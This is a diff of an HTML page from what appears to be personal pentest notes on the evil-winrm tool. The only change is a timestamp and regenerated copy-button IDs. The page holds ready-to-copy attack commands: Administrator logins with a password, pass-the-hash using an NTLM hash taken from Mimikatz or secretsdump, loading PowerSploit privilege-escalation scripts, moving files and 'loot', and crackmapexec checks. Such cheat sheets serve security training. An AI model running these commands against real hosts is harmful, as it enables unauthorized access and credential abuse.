@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:12 -->
+<!-- 2026-07-20 Mon 15:41 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>evil-winrm</title>
@@ -902,11 +902,11 @@ Related: <a href="../org/20260314T005621--credentials-harvesting__concept_cybers
 <h2 id="org41f37a6">Installation</h2>
 <div class="outline-text-2" id="text-org41f37a6">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_55a470492c6a4d5cae82a5ac8b4a996e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e453d8d1e9dc429689ee0e2c5e8de844>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_55a470492c6a4d5cae82a5ac8b4a996e=document.querySelector('button[name=btn_55a470492c6a4d5cae82a5ac8b4a996e]');
-copyBtnbtn_55a470492c6a4d5cae82a5ac8b4a996e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`gem install evil-winrm\n`);copyBtnbtn_55a470492c6a4d5cae82a5ac8b4a996e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_55a470492c6a4d5cae82a5ac8b4a996e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e453d8d1e9dc429689ee0e2c5e8de844=document.querySelector('button[name=btn_e453d8d1e9dc429689ee0e2c5e8de844]');
+copyBtnbtn_e453d8d1e9dc429689ee0e2c5e8de844.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`gem install evil-winrm\n`);copyBtnbtn_e453d8d1e9dc429689ee0e2c5e8de844.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e453d8d1e9dc429689ee0e2c5e8de844.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -999,11 +999,11 @@ let res = copyTextToClipboard(`gem install evil-winrm\n`);copyBtnbtn_55a470492c6
 <h3 id="org149dac0">Password Authentication</h3>
 <div class="outline-text-3" id="text-org149dac0">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f234d94659d04cab91b74b384c69d94f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d5c0ec3ec404443592db1d465c48f054>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f234d94659d04cab91b74b384c69d94f=document.querySelector('button[name=btn_f234d94659d04cab91b74b384c69d94f]');
-copyBtnbtn_f234d94659d04cab91b74b384c69d94f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`evil-winrm -i $IP -u Administrator -p Password123!\nevil-winrm -i $IP -u domain\\\\user -p Password123!\n`);copyBtnbtn_f234d94659d04cab91b74b384c69d94f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f234d94659d04cab91b74b384c69d94f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d5c0ec3ec404443592db1d465c48f054=document.querySelector('button[name=btn_d5c0ec3ec404443592db1d465c48f054]');
+copyBtnbtn_d5c0ec3ec404443592db1d465c48f054.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`evil-winrm -i $IP -u Administrator -p Password123!\nevil-winrm -i $IP -u domain\\\\user -p Password123!\n`);copyBtnbtn_d5c0ec3ec404443592db1d465c48f054.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d5c0ec3ec404443592db1d465c48f054.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1017,11 +1017,11 @@ evil-winrm -i $<span style="color: var(--clr-variable); background-color: var(--
 <h3 id="org0ce86f1">Pass the Hash</h3>
 <div class="outline-text-3" id="text-org0ce86f1">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6b0c6ae294b94b2491bbb29c4947c327>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_eb9177aacb794bcdb0d8eb245c539d4f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6b0c6ae294b94b2491bbb29c4947c327=document.querySelector('button[name=btn_6b0c6ae294b94b2491bbb29c4947c327]');
-copyBtnbtn_6b0c6ae294b94b2491bbb29c4947c327.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# NTLM hash from Mimikatz / secretsdump\nevil-winrm -i $IP -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\n\n# LM:NTLM format — can supply just NTLM (right side)\nevil-winrm -i $IP -u Administrator -H :NTLM_HASH_ONLY\n`);copyBtnbtn_6b0c6ae294b94b2491bbb29c4947c327.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6b0c6ae294b94b2491bbb29c4947c327.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_eb9177aacb794bcdb0d8eb245c539d4f=document.querySelector('button[name=btn_eb9177aacb794bcdb0d8eb245c539d4f]');
+copyBtnbtn_eb9177aacb794bcdb0d8eb245c539d4f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# NTLM hash from Mimikatz / secretsdump\nevil-winrm -i $IP -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\n\n# LM:NTLM format — can supply just NTLM (right side)\nevil-winrm -i $IP -u Administrator -H :NTLM_HASH_ONLY\n`);copyBtnbtn_eb9177aacb794bcdb0d8eb245c539d4f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eb9177aacb794bcdb0d8eb245c539d4f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1038,11 +1038,11 @@ let res = copyTextToClipboard(`# NTLM hash from Mimikatz / secretsdump\nevil-win
 <h3 id="org307df56">With Scripts and Executables</h3>
 <div class="outline-text-3" id="text-org307df56">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_58afafab9b2e409b9203a2bacd46432b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8d81f773c23945e986f589e9de90a26d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_58afafab9b2e409b9203a2bacd46432b=document.querySelector('button[name=btn_58afafab9b2e409b9203a2bacd46432b]');
-copyBtnbtn_58afafab9b2e409b9203a2bacd46432b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Load PowerShell scripts into session (auto-completes in shell)\nevil-winrm -i $IP -u Administrator -p Password123! \\\n  -s /usr/share/powersploit/Privesc/\n\n# Load executables (accessible via menu in session)\nevil-winrm -i $IP -u Administrator -p Password123! \\\n  -e /opt/tools/windows/\n`);copyBtnbtn_58afafab9b2e409b9203a2bacd46432b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_58afafab9b2e409b9203a2bacd46432b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8d81f773c23945e986f589e9de90a26d=document.querySelector('button[name=btn_8d81f773c23945e986f589e9de90a26d]');
+copyBtnbtn_8d81f773c23945e986f589e9de90a26d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Load PowerShell scripts into session (auto-completes in shell)\nevil-winrm -i $IP -u Administrator -p Password123! \\\n  -s /usr/share/powersploit/Privesc/\n\n# Load executables (accessible via menu in session)\nevil-winrm -i $IP -u Administrator -p Password123! \\\n  -e /opt/tools/windows/\n`);copyBtnbtn_8d81f773c23945e986f589e9de90a26d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8d81f773c23945e986f589e9de90a26d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1061,11 +1061,11 @@ let res = copyTextToClipboard(`# Load PowerShell scripts into session (auto-comp
 <h3 id="org732273c">Upload and Download Files</h3>
 <div class="outline-text-3" id="text-org732273c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8d27a0f2a62e463492033f8bbce60684>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a33fb7657f044effb3f443f24a65a694>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8d27a0f2a62e463492033f8bbce60684=document.querySelector('button[name=btn_8d27a0f2a62e463492033f8bbce60684]');
-copyBtnbtn_8d27a0f2a62e463492033f8bbce60684.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Within the evil-winrm session\nupload /local/path/file.exe C:\\Windows\\Temp\\file.exe\ndownload C:\\Windows\\Temp\\loot.txt /local/path/loot.txt\n`);copyBtnbtn_8d27a0f2a62e463492033f8bbce60684.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8d27a0f2a62e463492033f8bbce60684.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a33fb7657f044effb3f443f24a65a694=document.querySelector('button[name=btn_a33fb7657f044effb3f443f24a65a694]');
+copyBtnbtn_a33fb7657f044effb3f443f24a65a694.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Within the evil-winrm session\nupload /local/path/file.exe C:\\Windows\\Temp\\file.exe\ndownload C:\\Windows\\Temp\\loot.txt /local/path/loot.txt\n`);copyBtnbtn_a33fb7657f044effb3f443f24a65a694.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a33fb7657f044effb3f443f24a65a694.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1080,11 +1080,11 @@ download C:\Windows\Temp\loot.txt /local/path/loot.txt
 <h3 id="org6fe1346">SSL (port 5986)</h3>
 <div class="outline-text-3" id="text-org6fe1346">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3ac9896afd96404bbc73f0bce11a6ea7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5881ebcf26db44a9b9ad5765d629329a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3ac9896afd96404bbc73f0bce11a6ea7=document.querySelector('button[name=btn_3ac9896afd96404bbc73f0bce11a6ea7]');
-copyBtnbtn_3ac9896afd96404bbc73f0bce11a6ea7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`evil-winrm -i $IP -u Administrator -p Password123! -S -P 5986\n`);copyBtnbtn_3ac9896afd96404bbc73f0bce11a6ea7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3ac9896afd96404bbc73f0bce11a6ea7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5881ebcf26db44a9b9ad5765d629329a=document.querySelector('button[name=btn_5881ebcf26db44a9b9ad5765d629329a]');
+copyBtnbtn_5881ebcf26db44a9b9ad5765d629329a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`evil-winrm -i $IP -u Administrator -p Password123! -S -P 5986\n`);copyBtnbtn_5881ebcf26db44a9b9ad5765d629329a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5881ebcf26db44a9b9ad5765d629329a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1098,11 +1098,11 @@ let res = copyTextToClipboard(`evil-winrm -i $IP -u Administrator -p Password123
 <h2 id="org46143fc">Check WinRM Availability</h2>
 <div class="outline-text-2" id="text-org46143fc">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1dbe637f10ba45048f9d93ec2a8dc90a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7f41fb379f494e829d35a4ee0722c049>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1dbe637f10ba45048f9d93ec2a8dc90a=document.querySelector('button[name=btn_1dbe637f10ba45048f9d93ec2a8dc90a]');
-copyBtnbtn_1dbe637f10ba45048f9d93ec2a8dc90a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Nmap\nnmap -p 5985,5986 $IP\n\n# Test connection\ncurl -s http://$IP:5985/wsman\n\n# crackmapexec\ncrackmapexec winrm $IP -u Administrator -p Password123!\n`);copyBtnbtn_1dbe637f10ba45048f9d93ec2a8dc90a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1dbe637f10ba45048f9d93ec2a8dc90a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7f41fb379f494e829d35a4ee0722c049=document.querySelector('button[name=btn_7f41fb379f494e829d35a4ee0722c049]');
+copyBtnbtn_7f41fb379f494e829d35a4ee0722c049.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Nmap\nnmap -p 5985,5986 $IP\n\n# Test connection\ncurl -s http://$IP:5985/wsman\n\n# crackmapexec\ncrackmapexec winrm $IP -u Administrator -p Password123!\n`);copyBtnbtn_7f41fb379f494e829d35a4ee0722c049.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7f41fb379f494e829d35a4ee0722c049.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
